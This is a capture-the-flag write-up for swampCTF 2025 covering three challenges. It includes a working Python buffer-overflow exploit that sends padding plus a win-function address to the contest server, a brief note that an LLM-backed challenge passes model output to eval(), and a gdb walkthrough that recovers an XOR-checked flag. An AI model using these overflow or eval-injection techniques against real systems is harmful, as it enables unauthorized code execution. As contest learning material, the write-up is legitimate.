I love swampCTF. swampCTF 2024 was one of the first CTF's ive played and the first one where I felt immense satisfaction solving a challenge. A lot of high quality challenges all around, though it seems like this years was easier than last years.

<h2 id="beginner-pwn-2">Beginner Pwn 2</h2>
*Solved with Bentley*

### Solution
1. We take a look at `checksec`
![checksec](/ctfs/swampctf2025/checksec.webp)
This is good. We have no PIE and no canary. Straightforwards
2. Now, we try to find the return address
![checksec](/ctfs/swampctf2025/retaddr.webp)
Turns out the buffer size is 18, so anything afterwards is now the return statement.
3. We get the correct script as:
```
import pwn

r = pwn.remote("chals.swampctf.com", 40001)
win_addr = 0x401186

payload = b"A" * 18
payload += pwn.p64(win_addr)
r.sendline(payload)
print(r.recvall().decode('latin-1'))  # Print flag
r.close()
```

### Solution
1. Search for references of `flag`
![references](/ctfs/swampctf2025/references.webp)
2. We see that there is a hint here, and that it is using eval()
![eval](/ctfs/swampctf2025/eval.webp)
3. It is reading the LLM's response and then evaluating it and returning the eval's output as a response

### Solution
1. We first decompile with binary ninja
2. In the main function, We allocate 3 pointers and 1 variable, change a variable until its non-zero, do a lot more assignments to variables from constants loaded within memory, and perform a hashing function for each of them (there are like 20 of thes variables). Another loop of a pointer, and then we run the 2nd function
	1. ![libcmain](/ctfs/swampctf2025/libcmain.webp)
	2. ![3alloca](/ctfs/swampctf2025/3alloca.webp)
	3. ![nonzero](/ctfs/swampctf2025/nonzero.webp)
	4. ![lastassgn](/ctfs/swampctf2025/lastassgn.webp)
3. The second function is a lot more interesting. It constructs a list, with the first element as a function. Then, it calls that function.
![2ndfunc](/ctfs/swampctf2025/2ndfunc.webp)

##### Debugging
So, the function data is dynamicaly loaded. We debug to see whats going on.
- Enter libc_start_main
- Continue until we enter main which is here:
![gdb1](/ctfs/swampctf2025/gdb1.webp)
- Step into that call, then keep moving until we call rax. Our entry is at `0x5555555550c0`. This is what it looks like:
![gdb2](/ctfs/swampctf2025/gdb2.webp)
- It iterates through a loop, and it runs in it for __ times.
- Afterwards, it gradually pushes the word `Incorrect\n` onto the memory locations
![gdb3](/ctfs/swampctf2025/gdb3.webp)
- Then, it writes `Correct!\n` to the memory space afterwards
![gdb4](/ctfs/swampctf2025/gdb4.webp)
- Afterwards, save some data to the heap
![gdb5](/ctfs/swampctf2025/gdb5.webp)
- Enter a loop that repeats 181 times,
- Write the data, then jump into the next call. 
![gdb6](/ctfs/swampctf2025/gdb6.webp)
- Then, it tries to mmap, and it will jump out if it fails.
- It will then move some string contents into registers
![gdb6](/ctfs/swampctf2025/gdb7.webp)
- Moves some more things around
- Moves in some constants, then calls rbp 
![gdb6](/ctfs/swampctf2025/gdb8.webp)
- Inside rbp: string constants and data is being loaded
![gdb6](/ctfs/swampctf2025/gdb9.webp)
- Enters a loop that runs 38 times
![gdb6](/ctfs/swampctf2025/gdb10.webp)
- It should have a conditional move that occurs when dil is equal to r8b
![gdb6](/ctfs/swampctf2025/gdb11.webp)
**This is the key.**
- Initially, before the start of the loop, rbx is `Correct!\n`
![gdb6](/ctfs/swampctf2025/gdb12.webp)
- After the loop, if esi is 0, then the value at r14 (which is `Incorrect`) is moved into rbx, then it prints rbx.
![gdb6](/ctfs/swampctf2025/gdb13.webp)
	- ![gdb6](/ctfs/swampctf2025/gdb14.webp)
	- ![gdb6](/ctfs/swampctf2025/gdb15.webp)
	- If this comparison is not equal, then we will have to cmov
	- so, this comparison must be equal all 36 times
- Setting the first character to `s` passes the first check, so we know that it is decoding now character by character. Also, changing characters does not modify the `r8b` values, so these are constant.
- Now, we know that it loads the character into `dil`, xors it with `al` and compares it to be `r8b`. So, we should be able to find the character from the expected `r8b` values and `al` values.
- I have a script to help me calculate the next character, since I did not want to reverse engineer the encryption process
```python
def find_a(b_hex, c_hex):
  b_int = int(b_hex, 16)  # Convert b from hex to integer
  c_int = int(c_hex, 16)  # Convert c from hex to integer
  a_int = c_int ^ b_int  # Perform the XOR operation
  a_hex = hex(a_int)  # Convert a back to hexadecimal
  return a_hex

b_decimal = int(input('b_decimal: '))
b_hex = hex(b_decimal & 0xFF) #ensure 8 bit representation.
c_hex = input("c_hex: ")

result_hex = int(find_a(b_hex, c_hex), 16)
print(f"a = {result_hex}, chr(a) = {chr(result_hex)}")
```
Kept on running the script until i got the flag
